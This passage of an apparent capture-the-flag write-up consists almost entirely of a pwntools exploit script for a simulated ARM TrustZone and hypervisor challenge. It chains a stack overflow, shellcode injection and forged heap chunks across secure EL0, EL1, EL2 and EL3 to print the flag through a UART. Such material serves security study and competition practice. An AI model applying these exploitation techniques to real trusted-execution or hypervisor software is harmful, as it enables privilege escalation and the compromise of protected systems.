</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>sc_st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffd006</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> bytes(ks<span style="color:#f92672">.</span>asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    blr x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">6666</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./local_debug.sh&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./local_debug_secure.sh&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shellcode
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0x1000</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(sc_st)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>]
</span></span><span style="display:flex;"><span>SEL3_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x0, sp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>SEL3_shellcode <span style="color:#f92672">+=</span> bytes(read_flag)
</span></span><span style="display:flex;"><span>SEL3_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">ldr x11, =0x09000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x8, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">loop_print_flag_sel3:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x1, sp, x8 // dst
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cmp x8, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    bne loop_print_flag_sel3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x000000000e002210 00000fb0</span>
</span></span><span style="display:flex;"><span>WORLD_SHARED_MEM_VA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x023fe000</span>
</span></span><span style="display:flex;"><span>WORLD_SHARED_MEM_PA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40033000</span> 
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    ldr r0, =</span><span style="color:#e6db74">{</span>WORLD_SHARED_MEM_VA<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r10, r0, #0x20c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r2, =0x100de8 // 0xe499000 + 0xde8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r0, r10, r9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r1, r2, r9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb r0, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb r0, [r1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r9, r9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp r9, #</span><span style="color:#e6db74">{</span>len(SEL3_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // mapping
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, =0x8005008
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, =0xe00364f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, =0xe499783
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // ctx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, =0x8005008
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, =0xe00264f  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0] // tlb is already cached by the softmmu
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mcr p15, 0, r0, c8, c7, 0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    dsb sy
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    isb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0x1328
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, =0x800002cc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0x1330
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>) <span style="color:#75715e"># dummy code is added. </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># SEL1_shellcode += b&#39;\xfe\xff\xff\xea&#39; # loop for debugging</span>
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov r0, 0x8300
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    lsl r0, r0, #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    orr r0, r0, #0x7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>) <span style="color:#75715e"># separation needed.</span>
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">+=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;70 00 60 e1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TCI_Data_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010225c</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xf0\x08\xe8</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># thumb switch</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov r10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    lsl r10, r10, #16 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    orr r10, r10, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r10, r10, #0x10c 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0xb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, r10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0x0 // return to normal world
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>)
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(SEL0_shellcode))
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> SEL1_shellcode
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(SEL0_shellcode) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x200</span> <span style="color:#f92672">-</span> len(SEL0_shellcode))
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> SEL3_shellcode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SEL0_shellcode_src <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40035500</span>
</span></span><span style="display:flex;"><span>UART<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000009000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> 
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x00000000e4990b0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span><span style="color:#75715e"># chunk 1</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x1670</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0100060</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x14</span> <span style="color:#75715e"># chunk 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(UART)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, sp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) <span style="color:#f92672">+</span> bytes(read_flag) <span style="color:#f92672">+</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x0, sp, x9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x9, x9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_PA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>(SEL0_shellcode_src)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x21, x9, #0xc // shellcode_dst, TCI buf payload
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x25, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alloc_loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // alloc(i, 0x20, b&#39;&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, w25
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk w2, #0x20, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x1, x10
